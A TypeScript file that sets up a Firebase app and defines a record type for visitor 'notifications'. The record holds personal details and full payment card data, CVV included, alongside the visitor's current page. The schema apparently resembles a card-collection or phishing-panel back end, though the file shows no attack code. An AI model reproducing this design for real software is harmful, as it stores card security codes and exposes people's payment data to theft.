import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAQFKUhBkyCY6xYwtDOU92jHPVHCWxjdkE",
  authDomain: "ommns-7d92f.firebaseapp.com",
  databaseURL: "https://ommns-7d92f-default-rtdb.firebaseio.com",
  projectId: "ommns-7d92f",
  storageBucket: "ommns-7d92f.firebasestorage.app",
  messagingSenderId: "86163804101",
  appId: "1:86163804101:web:4dce616ff898481d9245ac",
  measurementId: "G-46K3XSZY10"
  };

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
